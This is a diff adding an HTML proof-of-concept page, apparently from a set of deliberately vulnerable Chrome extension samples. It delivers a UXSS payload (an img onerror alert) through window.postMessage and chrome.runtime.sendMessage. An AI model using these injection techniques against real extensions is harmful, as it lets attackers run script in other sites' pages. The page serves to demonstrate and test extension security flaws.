@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>A malicious website</title>
+	</head>
+	<body>
+
+		<h1>A malicious website</h1>
+
+		This malicious website acts as a web attacker.<br/>
+		It performs UXSS (Universal Cross-Site Scripting) by abusing vulnerabilities in Chrome extensions.<br/>
+		UXSS means that this site can inject JavaScript code into other websites, even if those websites do not have an XSS vulnerability and even if they have a CSP.<br/>
+
+		<!-- (a) /vuln02_weak_mv3_postMessage_ext_storage_uxss_via_bp -->
+		<!-- (b) /vuln02_weak_mv3_postMessage_ext_storage_uxss_via_cs -->
+		<script>
+			// Send a postMessage to the content script:
+			setTimeout(function() {
+				window.postMessage({ type: 'FROM_PAGE', payload: "<img src=\"x\" onerror=\"alert('UXSS')\" />" }, '*');
+			}, 100);
+		</script>
+
+		<br/>
+		<br/>
+		<br/>
+
+		<!-- (c) /vuln02_weak_mv3_runtime_sendMessage_uxss_via_bp -->
+		<!-- (d) /vuln02_weak_mv3_runtime_sendMessage_ext_storage_uxss_via_cs -->
+		<script>
+			// Send a message directly to the extension's service worker (background page):
+			setTimeout(function() {
+				let extensionId = "..."; // <== fill in extension ID here (!!!)
+				chrome.runtime.sendMessage( // A message from (malicious) page to (vulnerable) service worker
+					extensionId,
+					{user_name: "<img src=\"x\" onerror=\"alert('UXSS')\" />"},
+					function(response) {
+						console.log("Service worker responded with: " + response); // the response doesn't actually matter here!
+					}
+				);
+			}, 150);
+		</script>
+
+	</body>
+</html>
